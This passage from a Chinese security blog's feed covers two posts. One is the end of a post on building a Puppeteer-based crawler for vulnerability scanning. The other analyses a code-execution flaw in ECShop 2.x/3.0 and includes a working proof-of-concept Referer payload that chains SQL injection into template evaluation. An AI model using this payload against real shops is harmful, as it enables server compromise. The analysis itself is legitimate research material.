title="导航锁定"></a>导航锁定</h3><p>触发事件的过程中，可能会被意外的导航请求给中断操作，所以我们应当取消非本页面的导航请求，避免造成漏抓。<br><strong>前端JS跳转</strong><br>取消跳转操作，记录跳转URL，但是Chrome不允许我们通过<code>Object.defineProperty</code>重定义<code>window.Location</code>操作，即无法通过Hook获取跳转的URL。<br><img src="https://i.loli.net/2020/01/05/meiza4wDHx9jo1G.jpg" alt="-w705"></p><p>搜索了一些资料之后大致有下边一些解决办法：</p><ul><li><a href="http://blog.fatezero.org/2018/03/05/web-scanner-crawler-01/" target="_blank" rel="noopener">修改Chromium默认location属性的configurable为true</a></li><li>加载自定义插件</li><li>使用puppeteer的拦截器返回204状态码</li></ul><p>但最后我选择了<a href="https://github.com/myvyang/chromium_for_spider" target="_blank" rel="noopener">为漏扫动态爬虫定制的浏览器</a>，后边会细说。</p><p><strong>后端跳转</strong><br>请求体无内容，则跟进；请求体有内容，则渲染页面，记录跳转url。</p><h3 id="表单填充"><a href="#表单填充" class="headerlink" title="表单填充"></a>表单填充</h3><p><strong>锁定重置表单事件</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTMLFormElement.prototype.reset = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"cancel reset form"</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(HTMLFormElement.prototype, <span class="string">"reset"</span>, &#123;<span class="string">"writable"</span>: <span class="literal">false</span>, <span class="string">"configurable"</span>: <span class="literal">false</span>&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><blockquote><p>挖坑</p></blockquote><h3 id="为漏扫动态爬虫定制的浏览器"><a href="#为漏扫动态爬虫定制的浏览器" class="headerlink" title="为漏扫动态爬虫定制的浏览器"></a>为漏扫动态爬虫定制的浏览器</h3><p>解决这个前端导航hook问题的时候，发现github上有一个大牛通过修改源码实现了一个<a href="https://github.com/myvyang/chromium_for_spider" target="_blank" rel="noopener">为漏扫定制版的Chrome</a>。作者通过修改chromium源码实现了导航的Hook，禁止页面的天锻跳转并收集其跳转的URL，并且通过底层hook了所有非默认事件，为我们开发提供了很多便利。</p><p>但还是有一些小的地方需要我们自己优化一下，会锁定导航自动收集前端跳转URL，但不会处理后端的Location，这里我们用一个拦截器去实现，记录后端跳转，加入扫描队列：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.on(<span class="string">'response'</span>, interceptedResponse =&gt;&#123;</span><br><span class="line">    <span class="keyword">let</span> status = interceptedResponse.status();</span><br><span class="line">    <span class="keyword">if</span>(status.toString().substr(<span class="number">0</span>,<span class="number">2</span>) === <span class="string">"30"</span>)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"url: "</span> + interceptedResponse.url());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"status: "</span> + status);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"headers: "</span> + interceptedResponse.headers().location);</span><br><span class="line">        <span class="comment">// 添加进任务队列</span></span><br><span class="line">        cluster.queue(interceptedResponse.headers().location);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>事件触发&amp;收集结果</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">executeEvent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> firedEventNames = [<span class="string">"focus"</span>, <span class="string">"mouseover"</span>, <span class="string">"mousedown"</span>, <span class="string">"click"</span>, <span class="string">"error"</span>];</span><br><span class="line">    <span class="keyword">var</span> firedEvents = &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> length = firedEventNames.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        firedEvents[firedEventNames[i]] = <span class="built_in">document</span>.createEvent(<span class="string">"HTMLEvents"</span>);</span><br><span class="line">        firedEvents[firedEventNames[i]].initEvent(firedEventNames[i], <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> eventLength = <span class="built_in">window</span>.eventNames.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; eventLength; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> eventName =  <span class="built_in">window</span>.eventNames[i].split(<span class="string">"_-_"</span>)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> eventNode =  <span class="built_in">window</span>.eventNodes[i];</span><br><span class="line">        <span class="keyword">var</span> index = firedEventNames.indexOf(eventName);</span><br><span class="line">        <span class="keyword">if</span> (index &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (eventNode != <span class="literal">undefined</span>) &#123;</span><br><span class="line">                eventNode.dispatchEvent(firedEvents[eventName]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="built_in">window</span>.info.split(<span class="string">"_-_"</span>);</span><br><span class="line">    result.splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/05/1GeoYZhqvTsix7Q.jpg" alt="-w1679"></p><h3 id="添加cookie"><a href="#添加cookie" class="headerlink" title="添加cookie"></a>添加cookie</h3><p>对于使用SSO单点站点体系而言，可以在开始爬行之前指定一段cookie，比如从文本中读取。但是对于爬行目标较为多且SSO的覆盖面有限的情况下，就得使用数据库了。在测试过程中遇到了另一个问题，就是并发过高，或者发送有害的payload，会有Cookie失效的问题，这里想到了一种比较实用的解决办法，写一个浏览器插件及时将当前页面的cookie同步到服务端数据库，然后爬虫定期从数据库中更新最新的cookie。</p><p><strong>Chrome插件同步cookie</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateCookie</span>(<span class="params">domain, name , value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> api = <span class="string">"http://127.0.0.1/add-cookie"</span>;</span><br><span class="line">    $.post(api, &#123;</span><br><span class="line">        <span class="string">"domain"</span>: domain,</span><br><span class="line">        <span class="string">"name"</span>: name,</span><br><span class="line">        <span class="string">"value"</span>: value,</span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">data, status</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(status);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * doc: https://developer.chrome.com/extensions/cookies</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">chrome.cookies.onChanged.addListener(<span class="function">(<span class="params">changeInfo</span>) =&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// 记录Cookie增加，Cookie更新分两步，第一步先删除，第二步再增加</span></span><br><span class="line">    <span class="keyword">if</span>(changeInfo.removed === <span class="literal">false</span>)&#123;</span><br><span class="line">        updateCookie(changeInfo.cookie.name, changeInfo.cookie.value, changeInfo.cookie.domain);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h3 id="相似URL去重"><a href="#相似URL去重" class="headerlink" title="相似URL去重"></a>相似URL去重</h3><p>去重在爬虫中是一个较为核心功能，规则过于宽松可能导致爬行不完或者说做一些无意义的重复爬行，规则过于严格则可能导致抓取结果过少，影响后续抓取和漏洞检测。去重一般分为两步对爬行队列去重，或者对结果集去重。</p><p>在解决这个问题的时候，参考了Fr1day师傅<a href="https://www.anquanke.com/post/id/85298" target="_blank" rel="noopener">【技术分享】浅谈动态爬虫与去重</a>的URL去重思路。不失为一种比较便捷，能基本满足当前需求的一种解决办法。</p><p><strong>参数分析</strong><br>大致有以下几种参数：类型int、hash、中文、URL编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?m=home&amp;c=index&amp;a=index</span><br><span class="line">?type=202cb962ac59075b964b07152d234b70</span><br><span class="line">?id=1</span><br><span class="line">?msg=%E6%B6%88%E6%81%AF</span><br></pre></td></tr></table></figure></p><p>根据不同的类型对其进行处理：</p><ol><li>纯字母：中参数的值表示不同的路由功能，需要对这种参数进行保留</li><li>字母数字混合：可能是用户的hash，也可能具有路由功能，可根据任务量情况选择性保留</li><li>纯数字、URl编码：进行去重</li></ol><p>处理结果即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?m=home&amp;c=index&amp;a=index</span><br><span class="line">?type=&#123;hash&#125;</span><br><span class="line">?id=&#123;int&#125;</span><br><span class="line">?msg=&#123;urlencode&#125;</span><br></pre></td></tr></table></figure></p><p>然后在数据库中将相同的清洗掉即可。</p><h3 id="相似页面去重"><a href="#相似页面去重" class="headerlink" title="相似页面去重"></a>相似页面去重</h3><p>相似度计算，监控资产变化<br>网页结构相似度:<a href="http://xueshu.baidu.com/usercenter/paper/show?paperid=232b0da253211ecf9e2c85cb513d0bd3&amp;site=xueshu_se" target="_blank" rel="noopener">http://xueshu.baidu.com/usercenter/paper/show?paperid=232b0da253211ecf9e2c85cb513d0bd3&amp;site=xueshu_se</a></p><blockquote><p>挖坑</p></blockquote><h2 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h2><h3 id="图片资源优化"><a href="#图片资源优化" class="headerlink" title="图片资源优化"></a>图片资源优化</h3><p>禁止浏览器加载图片 =&gt; 返回一个fake img<br>实际测试过程中，有的网站在加载图片失败后，会尝试重新加载，这样会陷入一个死循环，导致发送大量数据包，占用性能。<br><img src="https://i.loli.net/2020/01/05/HIsrhXxkKeNiLGY.jpg" alt="-w598"></p><p><img src="https://i.loli.net/2020/01/05/wmfDyBQ2UZM7CI6.jpg" alt="-w1679"><br>代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(launchOptions);</span><br><span class="line"><span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line"><span class="keyword">await</span> preparePage(page);</span><br><span class="line"><span class="keyword">await</span> page.setRequestInterception(<span class="literal">true</span>);     <span class="comment">// 开启拦截功能</span></span><br><span class="line"><span class="keyword">await</span> page.on(<span class="string">'request'</span>, interceptedRequest =&gt; &#123;</span><br><span class="line">    <span class="comment">// 拦截图片请求</span></span><br><span class="line">    <span class="keyword">if</span> (interceptedRequest.resourceType() === <span class="string">'image'</span> || interceptedRequest.url().endsWith(<span class="string">'.ico'</span>)) &#123;</span><br><span class="line">        <span class="comment">//console.log(`abort image: $&#123;interceptedRequest.url()&#125;`);</span></span><br><span class="line">        <span class="keyword">let</span> images = fs.readFileSync(<span class="string">'public/image.png'</span>);</span><br><span class="line">        interceptedRequest.respond(&#123;</span><br><span class="line">            <span class="string">'contentType'</span>: <span class="string">' image/png'</span>,</span><br><span class="line">            <span class="string">'body'</span>: Buffer.from(images)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        interceptedRequest.continue();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><h3 id="拦截logout请求"><a href="#拦截logout请求" class="headerlink" title="拦截logout请求"></a>拦截logout请求</h3><p>避免爬虫爬行到登出链接，导致Cookie失效，这里做一个简单的拦截：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.on(<span class="string">'request'</span>, interceptedRequest =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(interceptedRequest.url().indexOf(<span class="string">"logout"</span>) !== <span class="number">-1</span>)&#123;</span><br><span class="line">        interceptedRequest.abort();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        interceptedRequest.continue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h2 id="puppeteer并发异步调度方案"><a href="#puppeteer并发异步调度方案" class="headerlink" title="puppeteer并发异步调度方案"></a>puppeteer并发异步调度方案</h2><p>简单粗暴，这里使用<a href="https://github.com/thomasdondorf/puppeteer-cluster#api" target="_blank" rel="noopener">puppeteer-cluster</a>库解决单Chrome多tab并发需求，也可以参考使用guimaizi师傅的demo:<a href="http://www.guimaizi.com/archives/535" target="_blank" rel="noopener">puppeteer异步并发方案</a></p><h2 id="开源"><a href="#开源" class="headerlink" title="开源"></a>开源</h2><p>这里边其实还有很多坑要填，师傅们多指点交流~<br>开源链接：<a href="https://github.com/Passer6y/CrawlerVuln" target="_blank" rel="noopener">https://github.com/Passer6y/CrawlerVuln</a><br>（求star</p><h2 id="待实现的需求"><a href="#待实现的需求" class="headerlink" title="待实现的需求"></a>待实现的需求</h2><p><strong>弹窗取消</strong></p><p><strong>代码注入时间</strong><br>链接收集有点不太全，触发完了事件后得等一会再收集url。</p><p><strong>待解决的bug</strong><br><code>page.once</code> 确定抓取链接时间</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文章首发先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/7064&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/7064&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;在两年前谷歌推出了一个Headless Chrome NodeJS API:&lt;a href=&quot;https://github.com/puppeteer/puppeteer&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Puppeteer&lt;/a&gt;，后来Github一个大牛用Python封装了一套api，作为一个第三方api:&lt;a href=&quot;https://github.com/miyakogi/pyppeteer&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Pyppeteer&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;在去年的时候，尝试过用Pyppeteer写过动态爬虫，Python版由于是第三方一个作者封装的，更新很慢，落后官方版本很多，很多迷之BUG，比如CDP协议去操作远程chromium，很容易中断导致一堆僵尸进程的chromium关不掉。虽然最后还是顶着各种bug，写成一个勉强能用的工具，但在服务器上很吃内存，一方面也是因为写的任务调度机制也有一些问题，最后服役了许多天天，不想维护了，捡了几个漏洞就退休了。后来在平时的工作和学习中频频接触到nodeJS，于是就趁着这段时间用nodejs重新实现一遍。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Code" scheme="http://0day.design/tags/Code/"/>
    
      <category term="Web" scheme="http://0day.design/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ECShop 2.x 3.0代码执行漏洞分析</title>
    <link href="http://0day.design/2019/09/30/ECShop%202.x%203.0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://0day.design/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/</id>
    <published>2019-09-30T14:10:00.000Z</published>
    <updated>2019-09-30T14:10:40.586Z</updated>
    
    <content type="html"><![CDATA[<p>之前渗透时遇到了这样一个站，当时看到这个二次注入引发的命令执行的过程有点意思，于是抽了个时间简单的复现分析了一下<br><a id="more"></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前渗透时遇到了这样一个站，当时看到这个命令执行的过程有点东西，于是抽了个时间复现一下</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>IDE: PHPstorm<br>代码：<br><a href="https://github.com/ec-shop/ecshop3.0.0906" target="_blank" rel="noopener">ECshop3.0</a><br><a href="https://github.com/shopex/ecshop" target="_blank" rel="noopener">ECShop 2.7.3</a></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>ECshop3.0<br>php 5.6<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&apos; /*&quot;;&#125;&#125;45ea207d7a2b68c49582d2d22adf953a</span><br></pre></td></tr></table></figure></p><p><img src="/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/media/15696548589918/15696662119731.jpg" alt="-w1613"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>user.php 305行渲染的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//310行</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($back_act) &amp;&amp; <span class="keyword">isset</span>($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 如果没有user.php， 则$back_act为referer</span></span><br><span class="line">    $back_act = strpos($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>], <span class="string">'user.php'</span>) ? <span class="string">'./index.php'</span> : $GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 330行</span></span><br><span class="line">$smarty-&gt;assign(<span class="string">'back_act'</span>, $back_act);     <span class="comment">// 渲染referer到模板</span></span><br><span class="line">$smarty-&gt;display(<span class="string">'user_passport.dwt'</span>);</span><br></pre></td></tr></table></figure></p><p>跟进<code>display</code>函数，includes/cls_template.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 106行</span><br><span class="line">$out = $this-&gt;fetch($filename, $cache_id);  // fetch模板，渲染变量</span><br><span class="line"></span><br><span class="line">if (strpos($out, $this-&gt;_echash) !== false)</span><br><span class="line">&#123;</span><br><span class="line">    $k = explode($this-&gt;_echash, $out); // _echash为定值</span><br><span class="line">    foreach ($k AS $key =&gt; $val)</span><br><span class="line">    &#123;</span><br><span class="line">        if (($key % 2) == 1)    // 如果是奇数个</span><br><span class="line">        &#123;       </span><br><span class="line">                // 45ea207d7a2b68c49582d2d22adf953a这个相当于分割符，方便从html提取出序列化数据</span><br><span class="line">            $k[$key] = $this-&gt;insert_mod($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $out = implode(&apos;&apos;, $k);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟进<code>insert_mod</code>函数，includes/cls_template.php 1168行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function insert_mod($name) // 处理动态内容</span><br><span class="line">&#123;</span><br><span class="line">    list($fun, $para) = explode(&apos;|&apos;, $name); // |前的为函数名，后为参数</span><br><span class="line">    $para = unserialize($para);</span><br><span class="line">    $fun = &apos;insert_&apos; . $fun;</span><br><span class="line"></span><br><span class="line">    return $fun($para);     // 可以执行insert_开头的函数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以通过控制referer，执行<code>insert_</code>开头的任意函数，来看includes/lib_insert.php：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// 141行</span><br><span class="line">function insert_ads($arr)</span><br><span class="line">&#123;</span><br><span class="line">    static $static_res = NULL;</span><br><span class="line"></span><br><span class="line">    $time = gmtime();</span><br><span class="line">    if (!empty($arr[&apos;num&apos;]) &amp;&amp; $arr[&apos;num&apos;] != 1)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql  = &apos;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &apos; .</span><br><span class="line">                    &apos;p.ad_height, p.position_style, RAND() AS rnd &apos; .</span><br><span class="line">                &apos;FROM &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad&apos;) . &apos; AS a &apos;.</span><br><span class="line">                &apos;LEFT JOIN &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad_position&apos;) . &apos; AS p ON a.position_id = p.position_id &apos; .</span><br><span class="line">                &quot;WHERE enabled = 1 AND start_time &lt;= &apos;&quot; . $time . &quot;&apos; AND end_time &gt;= &apos;&quot; . $time . &quot;&apos; &quot;.</span><br><span class="line">                    &quot;AND a.position_id = &apos;&quot; . $arr[&apos;id&apos;] . &quot;&apos; &quot; .</span><br><span class="line">                &apos;ORDER BY rnd LIMIT &apos; . $arr[&apos;num&apos;];</span><br><span class="line">        $res = $GLOBALS[&apos;db&apos;]-&gt;GetAll($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    // arr可控，形成sql注入， 继续往下跟</span><br><span class="line"></span><br><span class="line">// 170行</span><br><span class="line">    foreach ($res AS $row)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($row[&apos;position_id&apos;] != $arr[&apos;id&apos;]) // 查库的第2列字段</span><br><span class="line">        &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        $position_style = $row[&apos;position_style&apos;]; // 查库的第9列</span><br><span class="line">        $GLOBALS[&apos;smarty&apos;]-&gt;assign(&apos;ads&apos;, $ads);</span><br><span class="line">        $val = $GLOBALS[&apos;smarty&apos;]-&gt;fetch($position_style); // 重新带入模板渲染</span><br></pre></td></tr></table></figure></p><p>接着，includes/patch/includes_cls_template_fetch_str.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$template = $this;</span><br><span class="line">return preg_replace_callback(&quot;/&#123;([^\&#125;\&#123;\n]*)&#125;/&quot;, function($r) use(&amp;$template)&#123;return $template-&gt;select($r[1]);&#125;, $source);</span><br></pre></td></tr></table></figure></p><p>调select函数，includes/cls_template.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//375行 </span><br><span class="line">return &apos;&lt;?php echo &apos; . $this-&gt;get_val(substr($tag, 1)) . &apos;; ?&gt;&apos;;</span><br></pre></td></tr></table></figure></p><p>includes/cls_template.php <code>get_val</code>593行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 处理掉变量标签</span><br><span class="line">$p = $this-&gt;make_var($val);</span><br></pre></td></tr></table></figure></p><p>跟进<code>make_var</code>, includes/cls_template.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_var</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strrpos($val, <span class="string">'.'</span>) === <span class="keyword">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_var[$val]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_patchstack[$val]))</span><br><span class="line">        &#123;</span><br><span class="line">            $val = <span class="keyword">$this</span>-&gt;_patchstack[$val];</span><br><span class="line">        &#125;</span><br><span class="line">        $p = <span class="string">'$this-&gt;_var[\''</span> . $val . <span class="string">'\']'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 705行</span></span><br><span class="line">    <span class="keyword">return</span> $p;</span><br></pre></td></tr></table></figure></p><p>代码执行，includes/cls_template.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//1193行</span><br><span class="line">function _eval($content)</span><br><span class="line">&#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    eval(&apos;?&apos; . &apos;&gt;&apos; . trim($content));</span><br><span class="line">    $content = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line"></span><br><span class="line">    return $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前渗透时遇到了这样一个站，当时看到这个二次注入引发的命令执行的过程有点意思，于是抽了个时间简单的复现分析了一下&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Crypto" scheme="http://0day.design/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>RSA小结</title>
    <link href="http://0day.design/2019/04/27/RSA%E5%B0%8F%E7%BB%93/"/>
    <id>http://0day.design/2019/04/27/RSA小结/</id>
    <published>2019-04-27T12:46:00.000Z</published>
    <updated>2019-04-27T12:35:30.811Z</updated>
    
